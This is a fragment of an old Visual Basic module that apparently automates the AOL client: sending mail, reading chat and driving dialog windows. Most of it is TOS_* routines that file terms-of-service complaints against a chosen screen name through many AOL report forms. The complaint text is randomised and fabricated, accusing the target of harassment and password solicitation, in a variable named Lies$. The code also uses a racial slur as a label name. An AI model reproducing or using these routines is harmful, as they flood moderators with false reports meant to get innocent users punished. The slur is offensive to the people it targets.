aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
keyw% = FindChildByTitle(mdi%, "Keyword")
kedit% = FindChildByClass(keyw%, "_AOL_Edit")
If kedit% Then Exit Do
Loop

editsend% = SendMessageByString(kedit%, WM_SETTEXT, 0, Text)
pausing = DoEvents()
Sending% = SendMessage(kedit%, WM_CHAR, 13, 0)
pausing = DoEvents()
End Sub

Function AOLLastChatLine()
getpar% = AOLFindRoom()
child = FindChildByClass(getpar%, "_AOL_View")
GetTrim = sendmessagebynum(child, 14, 0&, 0&)
trimspace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, trimspace$)

theview$ = trimspace$


For FindChar = 1 To Len(theview$)
thechar$ = Mid(theview$, FindChar, 1)
thechars$ = thechars$ & thechar$

If thechar$ = Chr(13) Then
thechatext$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(thechars$)
Lastline = Mid(theview$, lastlen + 1, Len(thechars$) - 1)
AOLLastChatLine = Lastline
End Function

Sub Mail_SendNew(Person, Subject, message)
Call runmenubystring(AOLWindow(), "Compose Mail")

Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(mdi%, "Compose Mail")
icone% = FindChildByClass(mailwin%, "_AOL_Icon")
peepz% = FindChildByClass(mailwin%, "_AOL_Edit")
subjt% = FindChildByTitle(mailwin%, "Subject:")
subjec% = getwindow(subjt%, 2)
mess% = FindChildByClass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And mess% <> 0 Then Exit Do
Loop

a = SendMessageByString(peepz%, WM_SETTEXT, 0, Person)
a = SendMessageByString(subjec%, WM_SETTEXT, 0, Subject)
a = SendMessageByString(mess%, WM_SETTEXT, 0, message)
AOLIcon (icone%)

Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(mdi%, "Compose Mail")
erro% = FindChildByTitle(mdi%, "Error")
aolw% = findwindow("_AOL_Modal", vbNullString)
If mailwin% = 0 Then Exit Do
If aolw% <> 0 Then
a = SendMessage(aolw%, WM_Close, 0, 0)
AOLButton (FindChildByTitle(aolw%, "OK"))
a = SendMessage(mailwin%, WM_Close, 0, 0)
Exit Sub
End If
If erro% <> 0 Then
a = SendMessage(erro%, WM_Close, 0, 0)
a = SendMessage(mailwin%, WM_Close, 0, 0)
Exit Do
End If
Loop
last:
End Sub
Sub Mail_SendNew3(Person, Subject, message)
Call runmenubystring(AOLWindow(), "Compose Mail")

Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(mdi%, "Compose Mail")
icone% = FindChildByClass(mailwin%, "_AOL_Icon")
peepz% = FindChildByClass(mailwin%, "_AOL_Edit")
subjt% = FindChildByTitle(mailwin%, "Subject:")
subjec% = getwindow(subjt%, 2)
mess% = FindChildByClass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And mess% <> 0 Then Exit Do
Loop

a = SendMessageByString(peepz%, WM_SETTEXT, 0, Person)
a = SendMessageByString(subjec%, WM_SETTEXT, 0, Subject)
a = SendMessageByString(mess%, WM_SETTEXT, 0, message)
AOLIcon (icone%)
HideWindow (mailwin%)
Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(mdi%, "Compose Mail")
erro% = FindChildByTitle(mdi%, "Error")
aolw% = findwindow("_AOL_Modal", vbNullString)
If mailwin% = 0 Then Exit Do
If aolw% <> 0 Then
a = SendMessage(aolw%, WM_Close, 0, 0)
AOLButton (FindChildByTitle(aolw%, "OK"))
a = SendMessage(mailwin%, WM_Close, 0, 0)
Exit Sub
End If
If erro% <> 0 Then
a = SendMessage(erro%, WM_Close, 0, 0)
a = SendMessage(mailwin%, WM_Close, 0, 0)
Exit Do
End If
Loop
last:
End Sub
Sub Mail_SendNew2(Person, Subject, message)
Call runmenubystring(AOLWindow(), "Compose Mail")

Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(mdi%, "Compose Mail")
icone% = FindChildByClass(mailwin%, "_AOL_Icon")
peepz% = FindChildByClass(mailwin%, "_AOL_Edit")
subjt% = FindChildByTitle(mailwin%, "Subject:")
subjec% = getwindow(subjt%, 2)
mess% = FindChildByClass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And mess% <> 0 Then Exit Do
Loop

a = SendMessageByString(peepz%, WM_SETTEXT, 0, Person)
a = SendMessageByString(subjec%, WM_SETTEXT, 0, Subject)
a = SendMessageByString(mess%, WM_SETTEXT, 0, message)
X = MsgBox("Please Attch File And Send", vbCritical, "BuM Auto Tagger l3y GenghisX")
last:
End Sub
Function File_LoadINI(look$, FileNamer$) As String
On Error GoTo Sla
Open FileNamer$ For Input As #1
Do While Not EOF(1)
    Input #1, CheckOut$
    If InStr(UCase$(CheckOut$), UCase$(look$)) Then
        where = InStr(UCase$(CheckOut$), UCase$(look$))
        Out$ = Mid$(CheckOut$, where + Len(look$))
        File_LoadINI = Out$
    End If
Loop
Sla:
Close #1
Resume nigger
nigger:
End Function
Sub File_OpenEXE(File$)
OpenEXE = Shell(File$, 1): NoFreeze% = DoEvents()
End Sub
Sub File_ReName(File$, NewName$)
Name File$ As NewName$
NoFreeze% = DoEvents()
End Sub
Sub RemoveItemFromListbox(lst As ListBox, item$)
Do
NoFreeze% = DoEvents()
If LCase$(lst.List(a)) = LCase$(item$) Then lst.RemoveItem (a)
a = 1 + a
Loop Until a >= lst.ListCount
End Sub
Public Sub TransferListToTextBox(lst As ListBox, txt As TextBox)
'This moves the individual highlighted part of a
'listbox to a textbox
Ind = lst.ListIndex
daname$ = lst.List(Ind)
txt.Text = ""
txt.Text = daname$
End Sub
Function AOLUpChat()
Do
    X% = DoEvents()
aolmod = findwindow("_AOL_Modal", 0&)
KillWin (aolmod)
Loop Until aolmod = 0
End Function
Sub KillWin(windo)
X = sendmessagebynum(windo, WM_Close, 0, 0)
End Sub
Sub AOLMainMenu()
Call RunMenu3(2, 3)
End Sub



Sub AOLSetText(win, txt)
thetext% = SendMessageByString(win, WM_SETTEXT, 0, txt)
End Sub


Function AOLVersion3()
aol% = findwindow("AOL Frame25", vbNullString)
hMenu% = Getmenu(aol%)

SubMenu% = GetSubMenu(hMenu%, 0)
subitem% = GetMenuItemID(SubMenu%, 8)
MenuString$ = String$(100, " ")

FindString% = GetMenuString(SubMenu%, subitem%, MenuString$, 100, 1)

If UCase(MenuString$) Like UCase("P&ersonal Filing Cabinet") & "*" Then
AOLVersion = 3
Else
AOLVersion = 2.5
End If
End Function

Function AOLWindow()
aol% = findwindow("AOL Frame25", vbNullString)
AOLWindow = aol%
End Function






Sub NotOnTop(the As Form)
SetWinOnTop = SetWindowPos(the.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, Flags)
End Sub

Function Pause(interval)
current = Timer
Do While Timer - current < Val(interval)
DoEvents
Loop
End Function


Function timeout(interval)
current = Timer
Do While Timer - current < Val(interval)
DoEvents
Loop
End Function
Sub TOS_EmailViolation_1(Who$, phrase$)
'Sends a IM violation to "TOSIM1"
Randomize
    Phrases = 5
    Phrases = Int(Rnd * Phrases + 1)
      If Phrases = 1 Then Phrase2$ = "Please help me, look at what this guy is doing!"
      If Phrases = 2 Then Phrase2$ = "I am being harrassed! please take actions against this screen name!"
      If Phrases = 3 Then Phrase2$ = "This screen name is not only harrassing me, but he's harrassing others, mainly through Instant Messages. He likes to solicitate us for our passwords!"
      If Phrases = 4 Then Phrase2$ = "I do beleive this is agains AOL's Terms of Service"
      If Phrases = 5 Then Phrase2$ = "i have read AOL's Terms of Service index, and i am pretty sure this violates it!"
Text$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#0000ff" + Chr(34) + " SIZE=2><B>" + Who$ + ":</B>    " + "<FONT COLOR=" + Chr(34) + "#000000" + Chr(34) + " SIZE=3>" + phrase$ + "</HTML></PRE>" + Chr(13) + Chr(13) + Phrase2$
Randomize
    Phrases = 5
    Phrases = Int(Rnd * Phrases + 1)
      If Phrases = 1 Then Subject$ = "Terms of Service"
      If Phrases = 2 Then Subject$ = "AOL Violation"
      If Phrases = 3 Then Subject$ = "Please Help!"
      If Phrases = 4 Then Subject$ = "Terms of Service violation"
      If Phrases = 5 Then Subject$ = "AOL terms of service"
Call Ao_Email("TOSIM1", Subject$, Text$)
End Sub

Sub TOS_EmailViolation_2(Who$, phrase$)
'Sends a IM violation to "TOS General"
Randomize
    Phrases = 5
    Phrases = Int(Rnd * Phrases + 1)
      If Phrases = 1 Then Phrase2$ = "please help me, look at what this guy is doing!"
      If Phrases = 2 Then Phrase2$ = "I am being harrassed! please take actions against this screen name!"
      If Phrases = 3 Then Phrase2$ = "This screen name is not only harrassing me, but he's harrassing others, mainly through Instant Messages. He likes to solicitate us for our passwords!"
      If Phrases = 4 Then Phrase2$ = "I do beleive this is against AOL's Terms of Service"
      If Phrases = 5 Then Phrase2$ = "i have read AOL's Terms of Service index, and i am pretty sure this violates it!"
Text$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#0000ff" + Chr(34) + " SIZE=2><B>" + Who$ + ":</B>    " + "<FONT COLOR=" + Chr(34) + "#000000" + Chr(34) + " SIZE=3>" + phrase$ + "</HTML></PRE>" + Chr(13) + Chr(13) + Phrase2$
Randomize
    Phrases = 5
    Phrases = Int(Rnd * Phrases + 1)
      If Phrases = 1 Then Subject$ = "Terms of Service"
      If Phrases = 2 Then Subject$ = "AOL Violation"
      If Phrases = 3 Then Subject$ = "Please Help!"
      If Phrases = 4 Then Subject$ = "Terms of Service violation"
      If Phrases = 5 Then Subject$ = "aol terms of service"
Call Ao_Email("TOS General", Subject$, Text$)
End Sub

Sub TOS_EmailViolation_3(Who$, phrase$)
'Sends a chat violation to "TOS General"
Randomize
    Phrases = 5
    Phrases = Int(Rnd * Phrases + 1)
      If Phrases = 1 Then Subject$ = "Terms of Service"
      If Phrases = 2 Then Subject$ = "AOL Violation"
      If Phrases = 3 Then Subject$ = "Please Help!"
      If Phrases = 4 Then Subject$ = "Terms of Service violation"
      If Phrases = 5 Then Subject$ = "Help! I'm being harrassed"
Text$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#000000" + Chr(34) + " SIZE=3>" + Who$ + ": " + phrase$
Randomize
    kms = 5
   kms = Int(Rnd * kms + 1)
      If kms = 1 Then Lies$ = "please take action immediately!"
      If kms = 2 Then Lies$ = "I do beleive this is against AOL's Terms of Service"
      If kms = 3 Then Lies$ = "Something SHOULD be done about this person!!"
      If kms = 4 Then Lies$ = "i am sure this is not to be permitted on aol."
      If kms = 5 Then Lies$ = "i beleive this is a chat violation"
Biscuits$ = Text$ + Chr(13) + Chr(13) + Lies$
Call Ao_Email("TOS General", Subject$, Biscuits$)
End Sub

Sub TOS_EmailViolation_4(Who$, phrase$)
'Sends a screen name violation to "TOSNames1" (Chat text)
Randomize
    Phrases = 4
    Phrases = Int(Rnd * Phrases + 1)
      If Phrases = 1 Then Subject$ = "Terms of Service"
      If Phrases = 2 Then Subject$ = "Name Violation"
      If Phrases = 3 Then Subject$ = "screen name violation!"
      If Phrases = 4 Then Subject$ = "Terms of Service violation"
Text$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#000000" + Chr(34) + " SIZE=3>" + Who$ + ": " + phrase$
Shiz$ = Text$ + Chr(13) + Chr(13) + "I do beleive this screen name is against the TOS."
Call Ao_Email("TOSNames1", Subject$, Shiz$)
End Sub
Sub TOS_EmailViolation_5(Who$, phrase$)
'Sends a screen name violation to "TOSNames1" (IM text)
Randomize
    Phrases = 4
    Phrases = Int(Rnd * Phrases + 1)
      If Phrases = 1 Then Subject$ = "Terms of Service"
      If Phrases = 2 Then Subject$ = "Name Violation"
      If Phrases = 3 Then Subject$ = "screen name violation!"
      If Phrases = 4 Then Subject$ = "Terms of Service violation"
Text$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#0000ff" + Chr(34) + " SIZE=2><B>" + Who$ + ":</B>    " + "<FONT COLOR=" + Chr(34) + "#000000" + Chr(34) + " SIZE=3>" + phrase$
Shiz$ = Text$ + Chr(13) + Chr(13) + "I do beleive this screen name is against the TOS."
Call Ao_Email("TOSNames1", Subject$, Shiz$)
End Sub


Sub TOS_EmailViolation_6(Who$, phrase$)
'Sends a chat violation to "TOSKids"
Randomize
    Phrases = 4
    Phrases = Int(Rnd * Phrases + 1)
      If Phrases = 1 Then Subject$ = "Terms of Service"
      If Phrases = 2 Then Subject$ = "Violation"
      If Phrases = 3 Then Subject$ = "chatroom violation!"
      If Phrases = 4 Then Subject$ = "Terms of Service violation"
Randomize
    Biz = 6
    If Biz = 1 Then Hitz$ = "Blabbatorium1"
    If Biz = 2 Then Hitz$ = "Blabbatorium2"
    If Biz = 3 Then Hitz$ = "Blabbatorium3"
    If Biz = 4 Then Hitz$ = "Chatopia"
    If Biz = 5 Then Hitz$ = "Blabsville"
    If Biz = 6 Then Hitz$ = "Talksylvania"
Text$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#000000" + Chr(34) + " SIZE=3>" + Who$ + ": " + phrase$
Shiz$ = Text$ + Chr(13) + Chr(13) + "this person is bothering us in the " + Chr(34) + Hitz$ + Chr(34) + " chatroom"
Call Ao_Email("TOSKids", Subject$, Shiz$)
End Sub

Sub TOS_IMViolation_1(Who$, what$)
Ao_Keyword ("notifyaol")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
tosbttn% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name of Member Soliciting You:")
names% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(names%, 2)
said% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
Ao_SetText names%, Who$
Ao_Click said%
timeout 0.001
whatz$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#0000ff" + Chr(34) + " SIZE=2><B>" + Who$ + ":</B>     " + "<FONT COLOR = " + Chr(34) + "#000000" + " SIZE=3>" + what$
Ao_SetText said%, whatz$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin anal%
End Sub

Sub TOS_IMViolation_2(Who$, what$)
Ao_Keyword ("kohelp")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "I Need Help!")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
Ao_Click bttn3%
timeout 0.001
Do: DoEvents
toswin2% = FindChildByTitle(mdi%, "Report A Violation")
bttnz% = FindChildByClass(toswin2%, "_AOL_Icon")
blah% = GetNextWindow(bttnz%, 2)
tosbttn% = GetNextWindow(blah%, 2)
Loop Until toswin2% <> 0
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
toswin3% = FindChildByTitle(mdi%, "Violations via Instant Messages")
bull% = FindChildByTitle(toswin3%, "Date")
datez% = GetNextWindow(bull%, 2)
bull2% = FindChildByTitle(toswin3%, "Time AM/PM")
Timez% = GetNextWindow(bull2%, 2)
bull3% = FindChildByTitle(toswin3%, "CUT and PASTE a copy of the IM here")
said% = GetNextWindow(bull3%, 2)
bull4% = GetNextWindow(said%, 2)
donez% = GetNextWindow(bull4%, 2)
Loop Until toswin3% <> 0
Timez2$ = pc_time()
Datez2$ = pc_date()
Shiz$ = Who$ + ":     " + what$
Ao_SetText datez%, Datez2$
Ao_SetText Timez%, Timez2$
Ao_SetText said%, Shiz$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin2%
KillWin toswin%
End Sub

Sub TOS_IMViolation_3(Who$, what$)
Ao_Keyword ("ineedhelp")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
tosbttn% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name of Member Soliciting You:")
names% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(names%, 2)
said% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
Ao_SetText names%, Who$
Ao_Click said%
timeout 0.001
whatz$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#0000ff" + Chr(34) + " SIZE=2><B>" + Who$ + ":</B>     " + "<FONT COLOR = " + Chr(34) + "#000000" + " SIZE=3>" + what$
Ao_SetText said%, whatz$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
End Sub

Sub TOS_IMViolation_4(Who$, what$)
Ao_Keyword ("reachoutzone")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
reachwin% = FindChildByTitle(mdi%, "AOL Neighborhood Watch")
fuck% = FindChildByClass(reachwin%, "RICHCNTL")
fuck2% = GetNextWindow(fuck%, 2)
fuck3% = GetNextWindow(fuck2%, 2)
fuck4% = GetNextWindow(fuck3%, 2)
fuck5% = GetNextWindow(fuck4%, 2)
fuck6% = GetNextWindow(fuck5%, 2)
fuck7% = GetNextWindow(fuck6%, 2)
fuck8% = GetNextWindow(fuck7%, 2)
Loop Until reachwin% <> 0
timeout 3#
Ao_Click fuck8%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
tosbttn% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name of Member Soliciting You:")
names% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(names%, 2)
said% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
Ao_SetText names%, Who$
Ao_Click said%
timeout 0.001
whatz$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#0000ff" + Chr(34) + " SIZE=2><B>" + Who$ + ":</B>     " + "<FONT COLOR = " + Chr(34) + "#000000" + " SIZE=3>" + what$
Ao_SetText said%, whatz$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin reachwin%
End Sub

Sub TOS_IMViolation_5(Who$, what$)
Ao_Keyword ("kohelp")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "I Need Help!")
tosbttn% = FindChildByClass(toswin%, "_AOL_Icon")
Loop Until toswin% <> 0
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
toswin2% = FindChildByTitle(aol, "Report Password Solicitations")
blah% = FindChildByTitle(toswin2%, "Screen Name of Member Soliciting your Information:")
namez% = GetNextWindow(blah%, 2)
blah2% = FindChildByTitle(toswin2%, "Copy and Paste the solicitation here:")
textz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(textz%, 2)
Loop Until toswin2% <> 0
whatz$ = Who$ + ": " + what$
Ao_SetText namez%, Who$
Ao_SetText textz%, whatz$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
End Sub

Sub TOS_IMViolation_6(Who$, what$)
Ao_Keyword ("guidepager")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
guidewin% = FindChildByTitle(mdi%, "Request a Guide")
poop% = FindChildByClass(guidewin%, "_AOL_Icon")
Loop Until guidewin% <> 0
Ao_Click poop%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
tosbttn% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name of Member Soliciting You:")
names% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(names%, 2)
said% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
Ao_SetText names%, Who$
Ao_Click said%
timeout 0.001
whatz$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#0000ff" + Chr(34) + " SIZE=2><B>" + Who$ + ":</B>     " + "<FONT COLOR = " + Chr(34) + "#000000" + " SIZE=3>" + what$
Ao_SetText said%, whatz$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin guidewin%
End Sub

Sub TOS_IMViolation_7(Who$, what$)
Ao_Keyword ("postmaster")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
anal% = FindChildByTitle(mdi%, "Postmaster Online")
anal2% = FindChildByClass(anal%, "_AOL_Icon")
anal3% = GetNextWindow(anal2%, 2)
anal4% = GetNextWindow(anal3%, 2)
anal5% = GetNextWindow(anal4%, 2)
anal6% = GetNextWindow(anal5%, 2)
Loop Until anal% <> 0
Ao_Click anal6%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
tosbttn% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Screen Name of Member Soliciting You:")
names% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(names%, 2)
said% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
Ao_SetText names%, Who$
Ao_Click said%
timeout 0.001
whatz$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#0000ff" + Chr(34) + " SIZE=2><B>" + Who$ + ":</B>     " + "<FONT COLOR = " + Chr(34) + "#000000" + " SIZE=3>" + what$
Ao_SetText said%, whatz$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
KillWin anal%
End Sub

Sub TOS_IMViolation_8(Who$, what$)
Ao_Keyword ("aol://4344:50.DKPsurf2.6593499.548013513")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Report Password Solicitations")
blah% = FindChildByTitle(toswin%, "Screen Name of Member Soliciting Your Information:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
richz% = GetNextWindow(blah2%, 2)
bttnz% = GetNextWindow(richz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, Who$
whatz$ = Who$ + ": " + what$
Ao_Click richz%
Ao_SetText richz%, whatz$
Ao_Click bttnz%
timeout 0.001
waitforok
End Sub

Sub TOS_IMViolation_9(Who$, what$)
Ao_Keyword ("aol://4344:1732.TOSnote.13706095.560712263")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(mdi%, "MDIClient")
toswinz% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
passd% = FindChildByClass(toswinz%, "_AOL_Icon")
Loop Until toswinz% <> 0
timeout 2#
Ao_Click passd%
timeout 0.001
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "Report Password Solicitations")
blah% = FindChildByTitle(toswin%, "Screen Name of Member Soliciting Your Information:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
richz% = GetNextWindow(blah2%, 2)
bttnz% = GetNextWindow(richz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, Who$
whatz$ = Who$ + ": " + what$
Ao_Click richz%
Ao_SetText richz%, whatz$
Ao_Click bttnz%
timeout 0.001
waitforok
End Sub

Sub TOS_MSGBoardViolation_1(path$, message$)
Ao_Keyword ("notifyaol")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
tosbttn% = GetNextWindow(bttn3%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Complete Path Where Message Was Posted:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, path$
Ao_Click whatz%
Ao_SetText whatz%, message$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
End Sub

Sub TOS_MSGBoardViolation_2(path$, message$)
Ao_Keyword ("ineedhelp")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
tosbttn% = GetNextWindow(bttn3%, 2)
Loop Until toswin% <> 0
timeout 2#
Ao_Click tosbttn%
timeout 0.001
Do: DoEvents
blah% = FindChildByTitle(toswin%, "Enter Complete Path Where Message Was Posted:")
editz% = GetNextWindow(blah%, 2)
blah2% = GetNextWindow(editz%, 2)
whatz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(whatz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, path$
Ao_Click whatz%
Ao_SetText whatz%, message$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin%
End Sub

Sub TOS_MSGBoardViolation_3(path$, message$)
Ao_Keyword ("kohelp")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
toswin% = FindChildByTitle(mdi%, "I Need Help!")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
Ao_Click bttn3%
Do: DoEvents
toswin2% = FindChildByTitle(mdi%, "Report A Violation")
bttnz% = FindChildByClass(toswin2%, "_AOL_Icon")
blah% = GetNextWindow(bttnz%, 2)
blah2% = GetNextWindow(blah%, 2)
blah3% = GetNextWindow(blah2%, 2)
bttn4% = GetNextWindow(blah3%, 2)
Loop Until toswin2% <> 0
Ao_Click bttn4%
timeout 0.001
Do: DoEvents
toswin3% = FindChildByTitle(mdi%, "Message Board Violations")
Shiz% = FindChildByTitle(toswin3%, "COMPLETE Path where the message was posted")
shiz2% = GetNextWindow(Shiz%, 2)
shiz3% = GetNextWindow(shiz2%, 2)
shiz4% = GetNextWindow(shiz3%, 2)
shiz5% = GetNextWindow(shiz4%, 2)
donez% = GetNextWindow(shiz5%, 2)
Loop Until toswin3% <> 0
Ao_SetText shiz2%, path$
Ao_SetText shiz4%, message$
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin3%
KillWin toswin2%
KillWin toswin%
End Sub


Sub SendCharNum(win, chars)
e = sendmessagebynum(win, WM_CHAR, chars, 0)

End Sub

Function SetChildFocus(child)
setchild% = SetFocusAPI(child)
End Function

Sub SetPreference()
Call runmenubystring(AOLWindow(), "Preferences")

Do: DoEvents
prefer% = FindChildByTitle(AOLMDI(), "Preferences")
maillab% = FindChildByTitle(prefer%, "Mail")
mailbut% = getwindow(maillab%, GW_HWNDNEXT)
If maillab% <> 0 And mailbut% <> 0 Then Exit Do
Loop

Pause (0.2)
AOLIcon (mailbut%)

Do: DoEvents
aolmod% = findwindow("_AOL_Modal", "Mail Preferences")
aolcloses% = FindChildByTitle(aolmod%, "Close mail after it has been sent")
aolconfirm% = FindChildByTitle(aolmod%, "Confirm mail after it has been sent")
aolOK% = FindChildByTitle(aolmod%, "OK")
If aolOK% <> 0 And aolcloses% <> 0 And aolconfirm% <> 0 Then Exit Do
Loop
sendcon% = SendMessage(aolcloses%, BM_SETCHECK, 1, 0)
sendcon% = SendMessage(aolconfirm%, BM_SETCHECK, 0, 0)

AOLButton (aolOK%)
Do: DoEvents
aolmod% = findwindow("_AOL_Modal", "Mail Preferences")
Loop Until aolmod% = 0

closepre% = SendMessage(prefer%, WM_Close, 0, 0)

End Sub
Sub OnTop(the As Form)
Dim SetWinOnTop
SetWinOnTop = SetWindowPos(the.hwnd, HWND_TOPMOST, 0, 0, 0, 0, Flags)
End Sub

Sub StayOnTop(the As Form)
Dim SetWinOnTop
